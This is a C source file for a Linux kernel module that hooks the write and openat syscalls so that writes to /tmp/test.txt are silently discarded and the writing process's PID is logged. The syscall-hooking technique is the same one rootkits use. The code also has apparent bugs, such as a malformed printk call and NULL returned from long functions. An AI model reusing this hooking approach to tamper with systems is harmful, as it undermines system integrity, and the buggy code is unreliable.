#include "protectKing.h"

unsigned int targetFD = 0;

#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long hookWrite(struct pt_regs *regs) {
	if (regs->di == targetFD) {
		printk(KERN_INFO, "PID: %d tried to write to target file.\n", current->pid);
		return 0;
	}

	return ogWrite(regs);
}
#else
asmlinkage long hookWrite(unsigned int fd, const char __user *buf, size_t count) {
	if (fd == targetFD) {
		printk(KERN_INFO, "PID: %d tried to write to target file.\n", current->pid);
		return 0;
	}

	return ogWrite(fd, buf, count);
}
#endif
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage long hookOpenAt(struct pt_regs *regs) {
	char *buf = kzalloc(4096, GFP_KERNEL);
	
	if (!buf) return NULL;

	if (strncpy_from_user(buf, regs->si, 4096) < 0) {
		kfree(buf);
		return NULL;
	}
	
	if (strncmp(buf, "/tmp/test.txt", 13) == 0)
	{
		kfree(buf);
		targetFD = ogOpenAt(regs);
		printk(KERN_INFO "PID: %d opened the file\nFD: %ld\n", current->pid, targetFD);
		return targetFD;
	}

	kfree(buf);
	return ogOpenAt(regs);
}
#else
asmlinkage long hookOpenAt(int dfd, const char __user *filename, int flags, umode_t mode){
	char *buf = kzalloc(4096, GFP_KERNEL);
	
	if (!buf) return NULL;

	if (strncpy_from_user(buf, filename, 4096) < 0) {
		kfree(buf);
		return NULL;
	}
	
	if (strncmp(buf, "/tmp/test.txt", 13) == 0)
	{
		kfree(buf);
		targetFD = ogOpenAt(dfd, filename, flags, mode);
		printk(KERN_INFO "PID: %d opened the file\nFD: %ld\n", current->pid, targetFD);
		return targetFD;
	}

	kfree(buf);
	return ogOpenAt(dfd, filename, flags, mode);
}
#endif
